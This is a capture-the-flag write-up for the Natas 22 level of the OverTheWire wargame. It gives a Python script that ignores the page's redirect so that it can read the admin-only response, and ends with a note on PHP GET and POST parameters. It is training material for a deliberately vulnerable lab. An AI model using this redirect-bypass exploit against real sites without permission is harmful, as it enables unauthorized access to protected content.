# natas22

This is easy. Notice when everything is submitted as before(with or without cookie), we are being redirection to some `Location`. In the docs of `requests` library in python, it says we can disallow redirects. Thus our code becomes-
```python
import requests

# URLs for both sites
url = 'http://natas22.natas.labs.overthewire.org/index.php'

auth = ('natas22', '<password>')  # replace with the actual password

session = requests.Session()
session.auth = auth

# Step 1: Set the admin variable to 1 on the experimenter site
data = {'admin': '1'}
response = session.post(url, data=data)
params = {'revelio': ''}    

response = session.get(url,params=params, data=data, allow_redirects=False)

if 'You are an admin' in response.text:
    print('Success! Here is the response:')
    print(response.text)
else:
    print('Failed to get admin access.')
```

### Note about PHP
In PHP, data that is sent via a GET request is typically accessed through the $_GET superglobal array, while data sent via a POST request is accessed through the $_POST superglobal array.

If you see something like $_GET['param'] in the PHP code, that means the param is expected to be in the URL query string, and you would send it as a parameter (params) in your Python requests.

If you see $_POST['data'], that means the data is expected to be in the request body, and you would send it as data (data) in your Python requests.

In CTF's, they may go against this common idea to set up the problem, just like you can see in our previous codes.
